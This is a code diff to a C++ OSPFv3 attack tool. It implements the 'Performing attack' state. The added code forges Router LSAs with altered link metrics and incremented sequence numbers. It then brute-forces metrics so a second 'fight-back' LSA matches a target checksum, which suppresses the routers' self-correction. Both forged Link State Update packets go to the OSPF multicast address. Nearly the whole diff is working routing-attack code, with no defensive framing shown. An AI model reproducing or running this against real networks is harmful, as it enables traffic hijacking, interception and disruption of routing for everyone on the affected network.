@@ -16,6 +16,7 @@
 #include "parser/ospf/LinkStateRequestPacket.h"
 #include "parser/ospf/LinkStateUpdatePacket.h"
 #include "tinshelper.h"
+#include "parser/ospf/lsa/RouterLSAPacket.h"
 #include <queue>
 
 namespace sc = boost::statechart;
@@ -228,7 +229,7 @@ namespace statemachine {
 				partialLSAs.insert(partialLSAs.end(), lsas.begin(), lsas.end());
 				logger->trace("Obtained {} lsas.", lsas.size());
 				
-				context<Machine>().setTimeout(1s);
+				context<Machine>().setTimeout(3s);
 				return discard_event();
 				
 			}
@@ -236,7 +237,7 @@ namespace statemachine {
 			sc::result react(const event::Timeout &ignored) {
 				if (context<DatabaseTransfer>().partialLSAs.empty()) {
 					logger->info("No headers yet. Extending timeout.");
-					context<Machine>().setTimeout(1s);
+					context<Machine>().setTimeout(3s);
 					return discard_event();
 				} else {
 					logger->info("Collected {} LSA-headers in total.",
@@ -299,7 +300,7 @@ namespace statemachine {
 				fullLSAs.insert(fullLSAs.end(), lsas.begin(), lsas.end());
 				logger->trace("Obtained {} lsas.", lsas.size());
 				
-				context<Machine>().setTimeout(1s);
+				context<Machine>().setTimeout(3s);
 				return discard_event();
 				
 			}
@@ -322,7 +323,7 @@ namespace statemachine {
 				
 				if (v.empty()) {
 					logger->info("No LSAs yet. Extending timeout.");
-					context<Machine>().setTimeout(1s);
+					context<Machine>().setTimeout(3s);
 					return discard_event();
 				} else {
 					logger->info("Collected {} LSAs in total.", v.size());
@@ -339,7 +340,140 @@ namespace statemachine {
 				logger->info("Performing attack.");
 				
 				for (auto const&[a, b, metric] : context<Machine>().targets) {
-				
+					for (auto const &lsa : context<Machine>().lsas) {
+						if (lsa->getHeader().getFunction() == parser::LSAPacket::ROUTER_LSA &&
+						    (lsa->getHeader().advertising_router == a ||
+						     lsa->getHeader().advertising_router == b)) {
+							auto src = (lsa->getHeader().advertising_router == a) ? a : b;
+							auto dst = (lsa->getHeader().advertising_router == a) ? b : a;
+							auto newLSA = std::make_shared<parser::LSAPacket>(
+								lsa->serialize());
+							
+							{
+								auto newRouterLSA = std::dynamic_pointer_cast<parser::RouterLSAPacket>(
+									newLSA->getSubpacket());
+								
+								auto interfaces = newRouterLSA->getInterfaces();
+								for (auto &interface : interfaces) {
+									if (interface.neighbor_router_id == dst) {
+										interface.metric = metric;
+									}
+								}
+								newRouterLSA->setInterfaces(interfaces);
+								
+								auto hdr = newLSA->getHeader();
+								hdr.seq++;
+								newLSA->setHeader(hdr);
+							}
+							
+							auto origFBLSA = std::make_shared<parser::LSAPacket>(
+								lsa->serialize());
+							auto newFBLSA = std::make_shared<parser::LSAPacket>(
+								newLSA->serialize());
+							
+							{
+								auto origHdr = origFBLSA->getHeader();
+								origHdr.seq += 2;
+								origFBLSA->setHeader(origHdr);
+								origFBLSA->updateValues();
+								
+								auto tgtChecksum = origFBLSA->getHeader().checksum;
+
+								auto hdr = newFBLSA->getHeader();
+								hdr.seq ++;
+								newFBLSA->setHeader(hdr);
+								newFBLSA->updateValues();
+								
+								std::optional<std::shared_ptr<parser::LSAPacket>> yay = newFBLSA->modToChecksum(tgtChecksum);
+								
+								int c = 0;
+								while (!yay && (c++ < 16)) {
+									logger->trace("Checksum break failure. Incrementing metric.");
+									
+									auto newRouterLSA = std::dynamic_pointer_cast<parser::RouterLSAPacket>(
+										newFBLSA->getSubpacket());
+									
+									auto interfaces = newRouterLSA->getInterfaces();
+									for (auto &interface : interfaces) {
+										if (interface.neighbor_router_id == dst) {
+											interface.metric++;
+										}
+									}
+									newRouterLSA->setInterfaces(interfaces);
+									newFBLSA->updateValues();
+									
+									yay = newFBLSA->modToChecksum(tgtChecksum);
+								}
+								
+								if (c >= 16)
+									throw parser::MalformedPacketException("Unable to break checksum.");
+								
+								newFBLSA = yay.value();
+								newFBLSA->updateValues();
+								
+								if (newFBLSA->getHeader().checksum != origFBLSA->getHeader().checksum) {
+									throw parser::MalformedPacketException("Checksum mismatch.");
+								}
+							}
+							
+							auto forgedOSPFpkt = std::make_shared<parser::OSPFv3Packet>();
+							
+							{
+								auto ospfHdr = forgedOSPFpkt->getHeader();
+								ospfHdr.type = parser::OSPFv3Packet::LINK_STATE_UPDATE;
+								ospfHdr.router_id = context<Machine>().self;
+								ospfHdr.instance_id = 0;
+								ospfHdr.area_id = 0;
+								ospfHdr.version = 3;
+								forgedOSPFpkt->setHeader(ospfHdr);
+								
+								auto lsuPkt = std::make_shared<parser::LinkStateUpdatePacket>();
+								forgedOSPFpkt->setSubpacket(lsuPkt);
+								
+								{
+									auto lsas = lsuPkt->getLsas();
+									lsas.push_back(newLSA);
+									lsuPkt->setLsas(lsas);
+								}
+								
+								uint128_t neigh = context<Machine>().neighbor_hello->getSource();
+								forgedOSPFpkt->setDest(neigh);
+								forgedOSPFpkt->setSourceFromDest();
+								forgedOSPFpkt->setDest(tinshelper::tins_to_raw("ff02::5"));
+								forgedOSPFpkt->updateValues();
+							}
+							
+							auto forgedOSPFFBpkt = std::make_shared<parser::OSPFv3Packet>();
+							
+							{
+								auto ospfHdr = forgedOSPFFBpkt->getHeader();
+								ospfHdr.type = parser::OSPFv3Packet::LINK_STATE_UPDATE;
+								ospfHdr.router_id = context<Machine>().self;
+								ospfHdr.instance_id = 0;
+								ospfHdr.area_id = 0;
+								ospfHdr.version = 3;
+								forgedOSPFFBpkt->setHeader(ospfHdr);
+								
+								auto lsuPkt = std::make_shared<parser::LinkStateUpdatePacket>();
+								forgedOSPFFBpkt->setSubpacket(lsuPkt);
+								
+								{
+									auto lsas = lsuPkt->getLsas();
+									lsas.push_back(newFBLSA);
+									lsuPkt->setLsas(lsas);
+								}
+								
+								uint128_t neigh = context<Machine>().neighbor_hello->getSource();
+								forgedOSPFFBpkt->setDest(neigh);
+								forgedOSPFFBpkt->setSourceFromDest();
+								forgedOSPFFBpkt->setDest(tinshelper::tins_to_raw("ff02::5"));
+								forgedOSPFFBpkt->updateValues();
+							}
+							
+							forgedOSPFpkt->transmit();
+							forgedOSPFFBpkt->transmit();
+						}
+					}
 				}
 			}
 		};
